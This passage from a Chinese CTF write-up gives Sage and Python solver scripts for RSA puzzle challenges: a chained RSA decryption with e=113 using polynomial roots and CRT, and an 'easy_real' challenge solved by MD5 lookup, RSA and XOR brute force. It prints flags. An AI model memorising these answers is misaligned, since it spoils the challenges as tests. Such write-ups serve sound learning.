q[-Integer(<span class="number">1</span>)])</span><br><span class="line">--&gt; 121     eval(&quot;n_.append(n&#123;<span class="number">0</span>&#125;)&quot;<span class="selector-class">.format</span>(i-Integer(<span class="number">1</span>)))</span><br><span class="line">    122     print(&quot;上一个n&quot;, n_[-Integer(<span class="number">1</span>)])</span><br><span class="line">    123     solve(p[-Integer(<span class="number">1</span>)], <span class="selector-tag">q</span><span class="selector-attr">[-Integer(1)]</span>, c, e, n_<span class="selector-attr">[-Integer(1)]</span>)</span><br><span class="line"></span><br><span class="line">&lt;string&gt; in &lt;module&gt;</span><br><span class="line"></span><br><span class="line">TypeError: unsupported operand type(s) for -: <span class="string">&#x27;function&#x27;</span> and <span class="string">&#x27;int&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>报错是在预期内的。</strong><br>因为对于flag这一组的加密而言，没有n_（<strong>再上一组的n</strong>）了</p>
<p>此时，单独拿出c、p、q, 解出的m转byte</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#脚本<span class="number">2</span></span><br><span class="line">#Sage</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">53296318153341311013989348488093143123693921875654781175946491674187297</span></span><br><span class="line">p = <span class="number">953730950786751671162019537171974567</span></span><br><span class="line">q = <span class="number">1189933229053113361422958527792232151</span></span><br><span class="line">e = <span class="number">113</span></span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp in mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq in mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="keyword">int</span>(x), <span class="keyword">int</span>(y)], [p, q])</span><br><span class="line">        print(libnum.n2s(<span class="keyword">int</span>(solution)))</span><br></pre></td></tr></table></figure>

<p>得到多组乱码<br>根据题目中flag格式<code>flag=b&#39;DASCTF&#123;????????????????????&#125;&#39;</code>，搜索DASCTF，得解。</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b&quot;s*<span class="symbol">\x</span>fc<span class="symbol">\x</span>ec<span class="symbol">\x</span>a2<span class="symbol">\x</span>f4<span class="symbol">\x</span>cec<span class="symbol">\x</span>cf&#x27;<span class="symbol">\r</span>(a<span class="symbol">\x</span>02<span class="symbol">\x</span>86<span class="symbol">\x</span>de<span class="symbol">\x</span>ed<span class="symbol">\x</span>bc<span class="symbol">\x</span>9dwO<span class="symbol">\x</span>0f<span class="symbol">\x</span>d1Va,<span class="symbol">\x</span>e1<span class="symbol">\x</span>eeP<span class="symbol">\x</span>18&quot;</span><br><span class="line">b&#x27;<span class="symbol">\x</span>97<span class="symbol">\x</span>a9<span class="symbol">\x</span>07<span class="symbol">\x</span>d7<span class="symbol">\x</span>d3<span class="symbol">\x</span>a5<span class="symbol">\x</span>03<span class="symbol">\x</span>06<span class="symbol">\x</span>abz<span class="symbol">\x</span>a9&amp;<span class="symbol">\x</span>e1<span class="symbol">\x</span>fcI<span class="symbol">\x</span>c2Me<span class="symbol">\x</span>f9<span class="symbol">\x</span>bf<span class="symbol">\x</span>d9<span class="symbol">\x</span>b5<span class="symbol">\x</span>bdC]a<span class="symbol">\x</span>d0;sZ&#x27;</span><br><span class="line">b&#x27;2<span class="symbol">\x</span>d5<span class="symbol">\x</span>d4<span class="symbol">\x</span>17<span class="symbol">\x</span>e7O<span class="symbol">\x</span>06<span class="symbol">\x</span>e5<span class="symbol">\x</span>e7<span class="symbol">\x</span>13<span class="symbol">\x</span>85<span class="symbol">\x</span>a8<span class="symbol">\x</span>bb<span class="symbol">\x</span>12<span class="symbol">\x</span>b9<span class="symbol">\x</span>90<span class="symbol">\x</span>b910V<span class="symbol">\x</span>0eVk<span class="symbol">\x</span>c4<span class="symbol">\x</span>98<span class="symbol">\x</span>9f<span class="symbol">\x</span>ed<span class="symbol">\t</span>t<span class="symbol">\x</span>86&#x27;</span><br><span class="line">b&#x27;DASCTF&#123;s4g3m4th_i5_co0l!&#125;&#x27;</span><br><span class="line">b&#x27;$<span class="symbol">\x</span>83<span class="symbol">\x</span>fcx<span class="symbol">\x</span>9eD<span class="symbol">\x</span>d3<span class="symbol">\x</span>a5<span class="symbol">\x</span>06<span class="symbol">\n</span>J<span class="symbol">\x</span>baoI<span class="symbol">\x</span>9e<span class="symbol">\x</span>14<span class="symbol">\x</span>80+G4<span class="symbol">\x</span>8b<span class="symbol">\x</span>9015? LA<span class="symbol">\x</span>e7<span class="symbol">\x</span>e8&#x27;</span><br><span class="line">b&#x27;&#125;<span class="symbol">\x</span>9e!<span class="symbol">\x</span>1e<span class="symbol">\x</span>9c<span class="symbol">\x</span>c8<span class="symbol">\x</span>a2n&quot;<span class="symbol">\x</span>ee#<span class="symbol">\x</span>83<span class="symbol">\x</span>b8!<span class="symbol">\x</span>d5c<span class="symbol">\x</span>9c9[<span class="symbol">\x</span>b5F~<span class="symbol">\x</span>a0<span class="symbol">\x</span>b8<span class="symbol">\x</span>e3<span class="symbol">\x</span>b1R<span class="symbol">\x</span>e2&#125;<span class="symbol">\x</span>ea&#x27;</span><br><span class="line">b&quot;<span class="symbol">\x</span>1a<span class="symbol">\x</span>92&#123;&#x27;<span class="symbol">\x</span>f0?zO<span class="symbol">\x</span>f5<span class="symbol">\r</span>L<span class="symbol">\x</span>1d<span class="symbol">\x</span>11N?<span class="symbol">\x</span>13<span class="symbol">\x</span>c3<span class="symbol">\x</span>b2<span class="symbol">\x</span>08<span class="symbol">\x</span>d2&#123;<span class="symbol">\x</span>d7s<span class="symbol">\x</span>da0=h<span class="symbol">\x</span>16G<span class="symbol">\x</span>f8&quot;</span><br></pre></td></tr></table></figure>

<p><strong>DASCTF{s4g3m4th_i5_co0l!}</strong></p>
<h4 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"></span><br><span class="line">n0 = <span class="number">1134876149917575363176366704410565158549594427794901202977560677131703617</span></span><br><span class="line">n1 = <span class="number">68506321231437453734007374706367120760326482177047006099953454136095248103663</span></span><br><span class="line">n2 = <span class="number">7783503593765446343363083302704731608384677185199537317445372251030064778965500447</span></span><br><span class="line">n3 = <span class="number">1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493</span></span><br><span class="line">n4 = <span class="number">84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641</span></span><br><span class="line">n5 = <span class="number">4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771</span></span><br><span class="line">n6 = <span class="number">222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489</span></span><br><span class="line">n7 = <span class="number">19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437</span></span><br><span class="line">n8 = <span class="number">1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699</span></span><br><span class="line">n9 = <span class="number">62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643</span></span><br><span class="line">n10 = <span class="number">1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921</span></span><br><span class="line">n11 = <span class="number">128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061</span></span><br><span class="line">n12 = <span class="number">6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469</span></span><br><span class="line">n13 = <span class="number">1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113</span></span><br><span class="line">n14 = <span class="number">138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331</span></span><br><span class="line">n15 = <span class="number">8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659</span></span><br><span class="line">n16 = <span class="number">83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671</span></span><br><span class="line">n17 = <span class="number">10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167</span></span><br><span class="line">n18 = <span class="number">428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793</span></span><br><span class="line">n19 = <span class="number">24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101</span></span><br><span class="line">n20 = <span class="number">2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579</span></span><br><span class="line">n21 = <span class="number">157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087</span></span><br><span class="line">n22 = <span class="number">43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933</span></span><br><span class="line">n23 = <span class="number">2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531</span></span><br><span class="line">n24 = <span class="number">222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201</span></span><br><span class="line">n25 = <span class="number">44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399</span></span><br><span class="line">n26 = <span class="number">1062789633774349417938788353001516763303743389381120380522262327123099728631034935663418832664265833959487018276693680850987382421521055508477988016246558095545925414048663082368488342633334571240563</span></span><br><span class="line">e = <span class="number">113</span></span><br><span class="line">c = <span class="number">1028324919038104683475485759234995158466543298184637219012354053883391759172761125802189697762778242175407876548832454351014064525118465877297277847501477586955680645311999174005606833294172830817159</span></span><br><span class="line"></span><br><span class="line">p26 = <span class="number">978009050697262759337388871320370165458800566798280419667959552859180906066907114053826258140106617</span></span><br><span class="line">q26 = <span class="number">1086686910531802445146659484012613083647370307628438760118376029969836222533970554565751069314622539</span></span><br><span class="line">p25 = <span class="number">5952590790902091635268726673538951527433355660839816621733964706901441977862333411532558667717227</span></span><br><span class="line">q25 = <span class="number">7541333580839789645678699855290145212677767915429008863004397257213367753100058966625356835737037</span></span><br><span class="line">p24 = <span class="number">14702310219802004876082313481498680940324963613770096574742182597840558294030859405666549879531</span></span><br><span class="line">q24 = <span class="number">15115713372931874518523751684548940147062395364112500028355694776530968944848166318295947674571</span></span><br><span class="line">p23 = <span class="number">43870497594014737833600078975099212558645315030912084285417550950854483979406797450479252891</span></span><br><span class="line">q23 = <span class="number">59471978701477648587546053450213894562580907285714122639903144859545186463681183925646967041</span></span><br><span class="line">p22 = <span class="number">206721456778089912780641186795393376537372828449722520397829606593267585681448641482345737</span></span><br><span class="line">q22 = <span class="number">212549643149353357950643557614966235999942509894271006476145929120541407503538644651435909</span></span><br><span class="line">p21 = <span class="number">368461902207817023013078031477042541053987571003677386333567043030477451518424731838173</span></span><br><span class="line">q21 = <span class="number">428750921047556327595864876619292414694543668237320723518704707914310601565770504401619</span></span><br><span class="line">p20 = <span class="number">1328165608715012145707239303399129070657427496129541416861187541092152796676371237057</span></span><br><span class="line">q20 = <span class="number">1692196606246085729483398884059069884182535824953762329164855466589577530953493347747</span></span><br><span class="line">p19 = <span class="number">4479430800690915874719403516331677127806963529247809966024777708496270901092401687</span></span><br><span class="line">q19 = <span class="number">5467527956822382309398095704409409074818664888285375307055715842283183939297839923</span></span><br><span class="line">p18 = <span class="number">15874438801602936764330936047390981280096007684699625987478211613419079727910193</span></span><br><span class="line">q18 = <span class="number">26984206512970181742033712455904984758134288864531714209886622060356697128804201</span></span><br><span class="line">p17 = <span class="number">102366458668689911004027849640392002821642295855327735994412634235696717329671</span></span><br><span class="line">q17 = <span class="number">104379442774418262390337411577160146519860415840398189010112686742489182665577</span></span><br><span class="line">p16 = <span class="number">262775599542220820608778738911414710660835549772895468394761119434220071003</span></span><br><span class="line">q16 = <span class="number">317277895959173163347650321012213555955385929418622006880521870012130207557</span></span><br><span class="line">p15 = <span class="number">2623629589005115152329094552749299711026240699896424120660145647226563547</span></span><br><span class="line">q15 = <span class="number">3200631836176555526009533059891690177091538103904679780020639896015937897</span></span><br><span class="line">p14 = <span class="number">11136261905010083405430254612464029672882837025885682392810368001188527</span></span><br><span class="line">q14 = <span class="number">12445294229358634680867170058509842935273054334385354032543323581223253</span></span><br><span class="line">p13 = <span class="number">43449898447639409732732812916430042263570178747794530133229640125923</span></span><br><span class="line">q13 = <span class="number">46014074200352892806829193743016415423205917845271691428043440245531</span></span><br><span class="line">p12 = <span class="number">66882708962198932251728043152245270662769508317424500666902658099</span></span><br><span class="line">q12 = <span class="number">103424977238409568447978495499643051307907366367259219393937014631</span></span><br><span class="line">p11 = <span class="number">350121371461894793578110243222665782247737840410076591434903787</span></span><br><span class="line">q11 = <span class="number">367712839396521757736384350030802803477965822058616833553305103</span></span><br><span class="line">p10 = <span class="number">954412804126450754097808991490470782833291028309980575506163</span></span><br><span class="line">q10 = <span class="number">1567597041534155679238655992215022394597376421096298363211067</span></span><br><span class="line">p9 = <span class="number">6623023178993627032758350846838617937710601663528839184727</span></span><br><span class="line">q9 = <span class="number">9419832152875820180139633405089278278408407453522978357309</span></span><br><span class="line">p8 = <span class="number">37185691759470013533730603170661686570987787098353146897</span></span><br><span class="line">q8 = <span class="number">41680117092754807988080699273322244961911189757589699867</span></span><br><span class="line">p7 = <span class="number">135813272566456906193934636644217527100917542578856697</span></span><br><span class="line">q7 = <span class="number">140758317578347635848563045232314610161039815135897421</span></span><br><span class="line">p6 = <span class="number">385788223643735590500185001710758495904528462058461</span></span><br><span class="line">q6 = <span class="number">576581905150085393327734090419529952232186498060949</span></span><br><span class="line">p5 = <span class="number">1656848589754467667368312855929759764100120657831</span></span><br><span class="line">q5 = <span class="number">2714357008989072105081411295741540337141142641741</span></span><br><span class="line">p4 = <span class="number">7832299017937880395583715032476962329929226581</span></span><br><span class="line">q4 = <span class="number">10726403821316775206273675267109184566904426261</span></span><br><span class="line">p3 = <span class="number">24335212484189159197840692460327461505035059</span></span><br><span class="line">q3 = <span class="number">43974782968656404951924524450501283426052127</span></span><br><span class="line">p2 = <span class="number">88067722275537586769787599991567203589751</span></span><br><span class="line">q2 = <span class="number">88380889077762105057154017276462714444697</span></span><br><span class="line">p1 = <span class="number">232079231415308325450092906880606082069</span></span><br><span class="line">q1 = <span class="number">295185057334340451492588650872876746227</span></span><br><span class="line">p0 = <span class="number">953730950786751671162019537171974567</span></span><br><span class="line">q0 = <span class="number">1189933229053113361422958527792232151</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">p, q, c, e, n_</span>):</span></span><br><span class="line"></span><br><span class="line">    P.&lt;a&gt;= PolynomialRing(Zmod(p), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    f = a ^ e - c</span><br><span class="line">    mps = f.monic().roots()</span><br><span class="line"></span><br><span class="line">    P.&lt;a&gt;= PolynomialRing(Zmod(q), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    g = a ^ e - c</span><br><span class="line">    mqs = g.monic().roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">        x = mpp[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">            y = mqq[<span class="number">0</span>]</span><br><span class="line">            solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">            <span class="keyword">if</span> solution &lt; n_:</span><br><span class="line">                solutions.append(solution)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = []</span><br><span class="line">q = []</span><br><span class="line">n_ = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">27</span>):</span><br><span class="line">    solutions = []</span><br><span class="line">    i = <span class="number">26</span> - i</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c&quot;</span>, c)</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;p.append(p&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;p&#x27;</span>,p[-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;q.append(q&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;q&#x27;</span>, q[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;n_.append(n&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(i-<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;上一个n&quot;</span>, n_[-<span class="number">1</span>])</span><br><span class="line">    solve(p[-<span class="number">1</span>], q[-<span class="number">1</span>], c, e, n_[-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(solutions)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">21</span>:</span><br><span class="line">        c = solutions[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">9</span>:</span><br><span class="line">        c = solutions[-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">5</span>:</span><br><span class="line">        c = solutions[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = solutions[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = p[-<span class="number">1</span>]</span><br><span class="line">q = q[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;DASCTF&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(libnum.n2s(<span class="built_in">int</span>(solution))):</span><br><span class="line">            <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(solution)).decode())</span><br></pre></td></tr></table></figure>

<h3 id="easy-real"><a href="#easy-real" class="headerlink" title="easy_real"></a>easy_real</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">key = random.randint(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">	crypto += <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i])^key)</span><br><span class="line">m = crypto的<span class="built_in">ascii</span>十六进制</span><br><span class="line">e = random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(e))</span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line">q = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#37693cfc748049e45d87b8c7d8b9aacd</span></span><br><span class="line"><span class="comment">#4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line"><span class="comment">#3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br></pre></td></tr></table></figure>

<p> 简单的签到题</p>
<ul>
<li><p>去cmd5上查<code>37693cfc748049e45d87b8c7d8b9aacd</code>得到<code>e=23</code></p>
</li>
<li><p>知道p、n, <code>q = n// p</code>；phi可求</p>
</li>
<li><p>基础rsa，解出m</p>
</li>
<li><p>转换得到<code>&#39;ndios_;9kgE;WK8e;W?gWn&lt;\;k|nu&#39;</code></p>
</li>
<li><p>由题意，爆破key</p>
<p>按照常规格式，flag最后一位应该是<code>&#125;</code></p>
<p>由此得到，<strong>key=8</strong></p>
</li>
<li><p>异或得flag</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2, libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line">c= <span class="number">3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">23</span></span><br><span class="line"></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line">num = <span class="number">1</span></span><br><span class="line">m = <span class="string">&#x27;ndios_;9kgE;WK8e;W?gWn&lt;\;k|nu&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;第&#123;0&#125;个字符&#x27;</span>.<span class="built_in">format</span>(num))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span 